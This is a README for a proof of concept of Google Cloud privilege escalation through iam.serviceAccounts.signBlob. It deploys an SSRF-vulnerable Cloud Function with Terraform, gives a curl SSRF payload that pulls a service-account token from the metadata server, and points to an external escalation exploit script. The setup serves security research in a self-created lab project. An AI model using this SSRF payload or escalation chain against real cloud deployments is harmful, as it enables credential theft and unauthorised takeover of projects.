# PrivEsc PoC for iam.serviceAccounts.signBlob method for signing URLs

## Setup
1. Create [a new project](https://cloud.google.com/resource-manager/docs/creating-managing-projects#creating_a_project) in Google Cloud environment and choose it as current working one.
3. Open Cloud Shell and ensure that the current project is the new created one.
4. Download Terraform script and setup a vulnerable to SSRF Cloud Function:
```bash
git clone https://github.com/Horlad/signBlob_PrivEsc_PoC.git
cd signBlob_PrivEsc_PoC/terraform
terraform init -upgrade
terraform apply --var gcp_project_id=YOUR_GCP_PROJECT_ID
```

## Exploitation
1. In Terraform output you can locate a URL to the vulnerable Cloud Function. Exploit SSRF to obtain a temporary token of an attached service account which use `iam.serviceAccounts.signBlob` permission to sign URLs.
```
curl https://YOUR.CLOUD.FUNCTION.DOMAIN/?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/token&auth=Metadata-Flavor:%20Google
```
2. The Terraform output you can also find `App Engine` and `Compute Engine` default service accounts which were created automatically during the Cloud Function creation without explicit instructions. You can use them to escalate to `Editor` role via [the Rhinosecurity exploit](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signBlob-accessToken.py).
